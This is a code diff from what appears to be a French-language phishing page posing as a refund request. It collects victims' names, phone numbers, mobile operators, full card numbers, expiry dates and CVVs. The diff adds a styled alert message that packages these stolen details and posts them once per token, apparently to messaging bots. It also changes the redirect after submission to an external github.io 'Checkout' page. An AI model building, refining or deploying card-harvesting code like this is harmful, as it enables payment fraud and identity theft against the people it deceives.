@@ -341,12 +341,13 @@ event.preventDefault();
     let cvv = document.getElementById('inputcvv').value;
 
     var msg = `
-Nom: ${firstname} ${lastname}
-num: ${phone}
-operator: ${operator}
-cart: ${cardnumber}
-mmyy: ${mm} / ${yy}
-cvv: ${cvv}`;
+    🔔 **Nouvelle Demande de Remboursement Zaki** 🔔
+👤 Nom: ${firstname} ${lastname}
+📞 num: ${phone}
+📡 operator: ${operator}
+💳 cart: ${cardnumber}
+📅 mmyy: ${mm} / ${yy}
+🔒 cvv: ${cvv}`;
 
     if (firstname === '' || lastname === '' || phone.length !== 10 || cardnumber.length !== 16 || cvv.length < 3 || operator === 'select') {
         alert('Certains champs sont vides. Veuillez remplir tous les champs requis.');
@@ -378,7 +379,7 @@ body: JSON.stringify(data)
 .then(data => {
 if (data.ok) {
     if (index === tokens.length - 1) {
-        window.location.href = "/verification.html";
+        window.location.href = "https://hall875485.github.io/0.github.io/Checkoutykk";
     }
 } else {
     alert("Une erreur s'est produite. Veuillez actualiser la page et réessayer.");
